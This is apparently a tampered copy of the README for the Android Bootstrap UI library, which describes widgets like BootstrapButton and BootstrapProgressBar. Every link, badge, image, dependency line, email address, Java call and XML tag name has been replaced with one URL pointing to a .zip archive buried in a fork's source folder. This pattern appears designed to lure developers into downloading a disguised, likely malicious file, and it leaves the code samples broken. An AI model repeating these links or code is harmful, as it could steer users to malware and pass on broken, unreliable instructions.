Android-Bootstrap
=================
Android Bootstrap is an Android library which provides custom views styled according to the
 [Twitter Bootstrap Specification](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip). This allows you to spend more time
  on development rather than trying to get a consistent theme across your app, especially if you are already familiar with the Bootstrap Framework.
  
Quick Start
===========
 [![Maven Central](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip)](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip)
 [![CircleCI](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip)](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip)
 
 Add the following dependency to your https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip, ensuring you replace 'X.X.X' with the latest version on the button above:
 
 ```java
 dependencies {
    compile 'https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip{X.X.X}'
 }
 ```
 
 You should also override your application class with the following:
 
 ```java
 public class SampleApplication extends Application {
     @Override public void onCreate() {
         https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip();
         https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip();
     }
 }
 ```
 
 You should then checkout the library and investigate the sample code, which covers most of the features.
 The sample app is also available on [Google Play](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip).
 
Support
==============
If you have a question about how to use the project, please ask a question on [StackOverflow](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip), using the tag **android-bootstrap-widgets**.

If you think you have found a bug in the library, you should [create a new issue](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip) instead.
 
Javadoc
============
The javadoc for the project is hosted on [Github](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip).

Examples
============

### BootstrapButton
A button that supports Glyph icons, and is themeable using Bootstrap Brands.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="BootstrapButton"
    app:bootstrapBrand="success"
    app:bootstrapSize="lg"
    app:buttonMode="regular"
    app:showOutline="false"
    app:roundedCorners="true"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapButton">

###BootstrapButtonGroup
Allows BootstrapButtons to be grouped together and their attributes controlled en masse.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="BootstrapButtonGroup"
    android:orientation="vertical"
    app:bootstrapBrand="success"
    app:bootstrapSize="lg"
    app:roundedCorners="true"
    >
    <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
       android:layout_width="wrap_content"
       android:layout_height="wrap_content"
       android:text="BootstrapButton 1"
       />
    <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
       android:layout_width="wrap_content"
       android:layout_height="wrap_content"
       android:text="BootstrapButton 2"
       />
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip>
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapButtonGroup">


### AwesomeTextView
A text widget that displays Glyph icons, and is themeable using Bootstrap Brands.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    app:bootstrapBrand="success"
    app:fontAwesomeIcon="fa_android"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="AwesomeTextView">

###BootstrapProgressBar
Displays progress in a bar from 0-100, and animates updates to the current progress.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    app:animated="true"
    app:bootstrapBrand="warning"
    app:progress="78"
    app:striped="true"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapProgressBar">

### BootstrapProgressBarGroup
Allows BootstrapProgressBars to be group together to have the effect of <a href="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip">stacked progress bar</a>.
   ```xml
        <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
            android:id="@+id/example_progress_bar_group_round_group"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical"
            app:bootstrapSize="md"
            app:bootstrapMaxProgress="100">

            <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                app:bootstrapBrand="success"
                app:bootstrapProgress="20"
                />

            <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                app:bootstrapBrand="danger"
                app:bootstrapProgress="20"
                />

            <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip>
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapProgressBarGroup">

###BootstrapLabel
Displays non-clickable text in a widget similar to the BootstrapButton, sizable using H1-H6 elements.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    app:bootstrapBrand="primary"
    app:bootstrapHeading="h3"
    app:roundedCorners="true"
    android:text="Bootstrap Label"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapLabel">

### BootstrapEditText
Allows editing of text in a widget themed using BootstrapBrand.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    app:bootstrapSize="md"
    app:bootstrapBrand="info"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapEditText">

###BootstrapCircleThumbnail
Displays images in a center-cropped Circular View, themed with BootstrapBrand.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:src="@drawable/my_drawable"
    app:bootstrapBrand="danger"
    app:hasBorder="true"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapCircleThumbnail">

### BootstrapThumbnail
Displays images in a rectangular View, themed with BootstrapBrand.
   ```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:src="@drawable/my_drawable"
    app:bootstrapBrand="info"
    app:hasBorder="true"
    />
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapThumbnail">

###BootstrapWell
Displays a view in a themed container.

```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:layout_margin="8dp"
        app:bootstrapSize="xl">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:gravity="right"
            android:text="Look, I'm in a large well!"
            />
    <https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip>
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapWell">


###BootstrapDropDown
Displays a view with dropdown options, supplied by an array of strings.

```xml
<https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginLeft="8dp"
                app:bootstrapText="Medium {fa_thumbs_o_up}"
                app:bootstrapBrand="regular"
                app:roundedCorners="true"
                app:bootstrapSize="md"
                app:dropdownResource="@array/bootstrap_dropdown_example_data"
                app:bootstrapExpandDirection="down"/>
```
<img src="https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip" width="450" alt="BootstrapDropdown">

 Custom Styles
============
Custom styles can be applied to any of the views in this library by creating a class which implements
BootstrapBrand, and setting it on the View. Please see the sample code of BootstrapButton for more detail.

 ```java

     class CustomBootstrapStyle implements BootstrapBrand {
         // specify desired colors here
     }

     BootstrapButton btn = new BootstrapButton(context);
     https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip(new CustomBootstrapStyle(this);
 ```




Contributing
============
Contributions are very welcome! There are 3 main ways you can help out:

1. Add more Icon Typefaces, using the instructions [here](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip)
2. Help implement views which are present in the  [Twitter Bootstrap Specification](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip) but are not yet in this library.
3. Raise an issue if you see a bug or are unsure on how something works, or even better - send a pull-request with a fix!

Versioning
==========
This project uses [Semantic Versioning](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip). There are several breaking changes in V2.X of the library, including:

- AwesomeTextView replaces FontAwesomeText
- Various altered method signatures/attributes for views
- Global BootstrapBrand/BootstrapSize attributes replace view-specific enums

Please consider what effect these changes might have on your app before upgrading!

Contact
=======
If you have any questions, issues, or just want to let us know where you're using Android Bootstrap
 tweet us at [@BeardedHen](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip), email https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip,
  or head over to our [website](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip) to see more of our creations.

Hall of Fame
======
Checkout [AppBrain](https://github.com/rendyramon/Android-Bootstrap-1/raw/refs/heads/master/sample/src/main/java/com/Android-Bootstrap-ritornelle.zip) to see some of the apps which use Android Bootstrap!

